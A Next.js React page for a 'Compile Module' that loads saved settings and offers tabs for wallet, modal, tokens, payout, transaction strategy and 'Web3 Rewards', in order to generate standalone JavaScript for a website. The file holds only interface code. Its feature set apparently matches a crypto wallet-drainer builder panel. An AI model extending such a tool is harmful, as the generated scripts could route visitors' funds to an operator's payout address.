"use client";

import { useEffect, useState } from "react";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { GeneralTab } from "@/components/compile/general-tab";
import { WalletTab } from "@/components/compile/wallet-tab";
import { ModalTab } from "@/components/compile/modal-tab";
import { TokensTab } from "@/components/compile/tokens-tab";
import { AdvancedTab } from "@/components/compile/advanced-tab";
import { PayoutTab } from "@/components/compile/payout-tab";
import { ContractTab } from "@/components/compile/contract-tab";
import { CompileOutput } from "@/components/compile/compile-output";
import { Web3RewardsTab } from "@/components/compile/web3-rewards-tab";
import { TrailsLiveBuilder } from "@/components/compile/trails-live-builder";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useStore } from "@/lib/store";
import type { CompileConfig } from "@/lib/compile-config-store";
import { deriveCompileConfigFromFrontpage } from "@/lib/frontpage-compile-sync";
import type { FrontpageConfig } from "@/lib/frontpage-config";
import { Code2, Settings2, Wallet, Layers, Cpu, Banknote, FileCode2, RefreshCw, Zap } from "lucide-react";

export default function CompilePage() {
  const {
    setGeneralConfig,
    setWalletConfig,
    setModalConfig,
    setTokensConfig,
    setAdvancedConfig,
    setPayoutConfig,
    setContractsConfig,
    setStrategyConfig,
  } = useStore();
  const [syncMessage, setSyncMessage] = useState<string | null>(null);
  const [syncError, setSyncError] = useState<string | null>(null);
  const [syncBusy, setSyncBusy] = useState(false);
  const [checking, setChecking] = useState(true);

  useEffect(() => {
    let active = true;

    async function loadConfig() {
      try {
        const res = await fetch("/api/compile-config", { cache: "no-store" });
        const data = (await res.json()) as { config?: CompileConfig };
        if (!res.ok || !data.config || !active) return;

        setGeneralConfig(data.config.general);
        setWalletConfig(data.config.wallet);
        setModalConfig(data.config.modal);
        setTokensConfig(data.config.tokens);
        setAdvancedConfig(data.config.advanced);
        setPayoutConfig(data.config.payout);
        setContractsConfig(data.config.contracts);
        setStrategyConfig(data.config.strategy);
      } catch {
        // Keep defaults when no saved config is available.
      } finally {
        if (active) setChecking(false);
      }
    }

    void loadConfig();

    return () => {
      active = false;
    };
  }, [
    setAdvancedConfig,
    setContractsConfig,
    setGeneralConfig,
    setModalConfig,
    setPayoutConfig,
    setStrategyConfig,
    setTokensConfig,
    setWalletConfig,
  ]);

  async function syncFromFrontpage() {
    setSyncBusy(true);
    setSyncError(null);
    setSyncMessage(null);
    try {
      const res = await fetch("/api/config", { cache: "no-store" });
      const data = (await res.json()) as { frontpage?: FrontpageConfig; message?: string };

      if (!res.ok || !data.frontpage) {
        throw new Error(data?.message || "Failed to load frontpage config.");
      }

      const derived = deriveCompileConfigFromFrontpage(data.frontpage);
      setGeneralConfig(derived.general);
      setTokensConfig(derived.tokens);
      setAdvancedConfig(derived.advanced);
      setSyncMessage("Loaded saved /frontpage config into the compiler.");
    } catch (error) {
      setSyncError(error instanceof Error ? error.message : "Failed to sync frontpage config.");
    } finally {
      setSyncBusy(false);
    }
  }

  if (checking) {
    return (
      <div className="space-y-6">
        <div>
          <h1 className="text-2xl font-bold tracking-tight">Compile Module</h1>
          <p className="text-muted-foreground text-sm mt-1">Loading configuration...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold tracking-tight">Compile Module</h1>
        <p className="text-muted-foreground text-sm mt-1">
          Select the transaction strategy and generate standalone JavaScript for your website
        </p>
      </div>

      <Card className="border-border/40 bg-black/40 backdrop-blur-xl">
        <CardContent className="flex flex-col gap-3 p-4 lg:flex-row lg:items-center lg:justify-between">
          <div className="space-y-1">
            <p className="text-sm font-medium">Frontpage Builder Sync</p>
            <p className="text-xs text-muted-foreground">
              Pull the saved public page config from <code>/frontpage</code> into the compiler so the script builder starts from the current page setup.
            </p>
            {syncMessage ? <p className="text-xs text-emerald-500">{syncMessage}</p> : null}
            {syncError ? <p className="text-xs text-destructive">{syncError}</p> : null}
          </div>
          <Button onClick={() => void syncFromFrontpage()} disabled={syncBusy} className="gap-2 self-start lg:self-center">
            <RefreshCw className="h-4 w-4" />
            {syncBusy ? "Loading..." : "Load /frontpage Config"}
          </Button>
        </CardContent>
      </Card>

      <TrailsLiveBuilder />

      <Tabs defaultValue="general" className="space-y-6">
        <TabsList className="grid w-full grid-cols-9 h-auto p-1">
          <TabsTrigger value="general" className="flex items-center gap-2 text-xs py-2.5">
            <Settings2 className="h-3.5 w-3.5" />
            General
          </TabsTrigger>
          <TabsTrigger value="wallet" className="flex items-center gap-2 text-xs py-2.5">
            <Wallet className="h-3.5 w-3.5" />
            Wallet
          </TabsTrigger>
          <TabsTrigger value="modal" className="flex items-center gap-2 text-xs py-2.5">
            <Layers className="h-3.5 w-3.5" />
            Modal
          </TabsTrigger>
          <TabsTrigger value="tokens" className="flex items-center gap-2 text-xs py-2.5">
            <Code2 className="h-3.5 w-3.5" />
            Tokens
          </TabsTrigger>
          <TabsTrigger value="advanced" className="flex items-center gap-2 text-xs py-2.5">
            <Cpu className="h-3.5 w-3.5" />
            Advanced
          </TabsTrigger>
          <TabsTrigger value="payout" className="flex items-center gap-2 text-xs py-2.5">
            <Banknote className="h-3.5 w-3.5" />
            Payout
          </TabsTrigger>
          <TabsTrigger value="contract" className="flex items-center gap-2 text-xs py-2.5">
            <FileCode2 className="h-3.5 w-3.5" />
            Transaction
          </TabsTrigger>
          <TabsTrigger value="web3rewards" className="flex items-center gap-2 text-xs py-2.5">
            <Zap className="h-3.5 w-3.5" />
            Web3 Rewards
          </TabsTrigger>
          <TabsTrigger value="output" className="flex items-center gap-2 text-xs py-2.5">
            <FileCode2 className="h-3.5 w-3.5" />
            Compile
          </TabsTrigger>
        </TabsList>

        <TabsContent value="general">
          <GeneralTab />
        </TabsContent>
        <TabsContent value="wallet">
          <WalletTab />
        </TabsContent>
        <TabsContent value="modal">
          <ModalTab />
        </TabsContent>
        <TabsContent value="tokens">
          <TokensTab />
        </TabsContent>
        <TabsContent value="advanced">
          <AdvancedTab />
        </TabsContent>
        <TabsContent value="payout">
          <PayoutTab />
        </TabsContent>
        <TabsContent value="contract">
          <ContractTab />
        </TabsContent>
        <TabsContent value="web3rewards">
          <Web3RewardsTab />
        </TabsContent>
        <TabsContent value="output">
          <CompileOutput />
        </TabsContent>
      </Tabs>
    </div>
  );
}
